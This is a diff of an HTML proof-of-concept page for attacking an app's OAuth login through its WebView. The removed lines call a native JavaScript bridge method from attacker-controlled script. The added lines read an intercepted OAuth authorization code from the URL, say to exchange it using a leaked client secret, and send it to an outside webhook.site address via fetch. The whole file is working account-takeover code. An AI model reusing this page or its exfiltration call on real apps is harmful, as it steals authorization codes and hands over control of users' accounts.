@@ -1,21 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>Exploit PoC</title></head>
-<body style="background:#111;color:#0f0;font-family:sans-serif;text-align:center;padding:50px;">
-    <h1>🔥 Loaded in WebView!</h1>
-    <p>If you see this, external URL loading + JS execution works.</p>
+<head><title>ATO PoC</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+    <h1>✅ OAuth Code Intercepted!</h1>
+    <pre id="output"></pre>
+
     <script>
-      console.log("Exploit JS running in app context");
-      if (typeof OAuth2JavaScriptInterface !== "undefined") {
-        try {
-          OAuth2JavaScriptInterface.processErrorAndFinish();
-          alert("✅ Called native method from attacker JS!");
-        } catch(e) {
-          alert("Call failed: " + e);
+        const params = new URLSearchParams(window.location.search);
+        const code = params.get('code');
+        const state = params.get('state');
+
+        if (code) {
+            document.getElementById('output').innerHTML = 
+                `Auth Code: ${code}\n\n` +
+                `State: ${state}\n\n` +
+                `→ Now exchange with leaked client_secret at /token endpoint`;
+            // Optional: auto-exfil to your server
+            fetch('https://webhook.site/fcae97a7-2bde-426e-96e8-c2ed6537c466/code=' + encodeURIComponent(code));
+        } else {
+            document.getElementById('output').innerText = "No code yet... (waiting for redirect)";
         }
-      } else {
-        alert("Interface not exposed or not loaded yet");
-      }
     </script>
 </body>
 </html>
